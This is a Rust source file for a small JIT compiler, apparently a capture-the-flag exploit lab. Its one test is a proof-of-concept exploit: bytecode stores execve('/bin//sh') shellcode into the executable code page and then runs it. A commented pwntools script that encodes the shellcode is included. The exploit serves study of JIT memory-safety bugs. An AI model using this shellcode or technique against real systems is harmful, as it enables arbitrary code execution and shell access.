pub mod asm;
pub mod bytecode;
mod cfg;
pub mod error;
pub mod ice_wrapper;
mod linear_scan;
pub mod memory;
pub mod vasm;

use std::collections::HashMap;
use std::io::{self, BufRead};

fn pg_round_up(length: usize) -> usize {
    (length & 0xFFFFFFFFFFFFF000) + 0x1000
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_code() {
        let bc: Vec<u8> = vec![
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  // r1 = 0
            /*0x03, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00,  // rN = 0 to pressure vreg allocation to allocate rax
            0x03, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00,
            0x03, 0x04, 0x00, 0x04, 0x00, 0x00, 0x00,
            0x03, 0x05, 0x00, 0x05, 0x00, 0x00, 0x00,
            0x03, 0x06, 0x00, 0x06, 0x00, 0x00, 0x00,
            0x03, 0x07, 0x00, 0x07, 0x00, 0x00, 0x00,
            0x03, 0x08, 0x00, 0x08, 0x00, 0x00, 0x00,
            0x03, 0x09, 0x00, 0x09, 0x00, 0x00, 0x00,
            0x03, 0x0a, 0x00, 0x0a, 0x00, 0x00, 0x00,
            0x03, 0x0b, 0x00, 0x0b, 0x00, 0x00, 0x00,*/
            //0x03, 0x0c, 0x00, 0x0c, 0x00, 0x00, 0x00,
            //0x03, 0x0d, 0x00, 0x0d, 0x00, 0x00, 0x00,  // rN = 0 end
            //0x00, 0x00, 0x00, 0xdd, 0xcc, 0xbb, 0xaa,  // r0 = payload
            //0x02, 0x00, 0x00, 0x01, 0x00, 0x00, 0xff,  // [r1 + 0xff00] = r0
            0x00, 0x00, 0x00, 0x31, 0xd2, 0x31, 0xf6,
            0x02, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff,
            0x00, 0x00, 0x00, 0x56, 0x48, 0xbb, 0x2f,
            0x02, 0x00, 0x00, 0x01, 0x00, 0x13, 0x01,
            0x00, 0x00, 0x00, 0x62, 0x69, 0x6e, 0x2f,
            0x02, 0x00, 0x00, 0x01, 0x00, 0x17, 0x01,
            0x00, 0x00, 0x00, 0x2f, 0x73, 0x68, 0x53,
            0x02, 0x00, 0x00, 0x01, 0x00, 0x1b, 0x01,
            0x00, 0x00, 0x00, 0x54, 0x5f, 0xb0, 0x3b,
            0x02, 0x00, 0x00, 0x01, 0x00, 0x1f, 0x01,
            0x00, 0x00, 0x00, 0x0f, 0x05, 0x90, 0x90,
            0x02, 0x00, 0x00, 0x01, 0x00, 0x23, 0x01,
            /*
            from pwn import *
            shellcode = b"\x31\xD2\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x90\x90"
            for i in range(len(shellcode)//4):
                data = shellcode[i*4:(i+1)*4]
                print(f'0x00, 0x00, 0x00, {data[0]:#04x}, {data[1]:#04x}, {data[2]:#04x}, {data[3]:#04x},')
                print(f'0x02, 0x00, 0x00, 0x01, 0x00, {0x20+i*4:#04x}, 0x01,')
            */
        ];
        let bc_parsed = bytecode::TranslationUnit::new(&bc).unwrap();
        let mem = memory::page_allocate(0x1000, false).unwrap();
        println!("bytecode: ");
        println!("{}", &bc_parsed);
        let mut function_table = HashMap::new();
        function_table.insert("deoptimize".to_string(), 0xdeadbeef);
        let vasm = vasm::TranslationUnit::new(&bc_parsed, &mem, &function_table).unwrap();
        println!("vasm: ");
        println!("{}", &vasm);
        let asm = asm::TranslationUnit::new(&vasm).unwrap();
        println!("asm: ");
        println!("{}", &asm);
        let asm_bytes_prelim = ice_wrapper::assemble(&asm, 0x0).unwrap();
        let code_mem = memory::page_allocate(pg_round_up(asm_bytes_prelim.len()), true).unwrap();
        let asm_bytes = ice_wrapper::assemble(&asm, code_mem.pointer as u64).unwrap();
        println!("code_mem.pointer: ");
        println!("{}", code_mem.pointer as u64);
        let value = unsafe {
            std::ptr::copy(asm_bytes.as_ptr(), code_mem.pointer, asm_bytes.len());
            let fptr = code_mem.pointer as *const ();
            let stdin = io::stdin();
            let _ = stdin.lock().read_line(&mut String::new()).unwrap();
            let func: extern "C" fn() -> u64 = unsafe { std::mem::transmute(fptr) };
            (func)()
        };
        //ice_wrapper::print_disassembly(&asm_bytes, code_mem.pointer as u64);
        //assert_eq!(value, 1);
    }
}
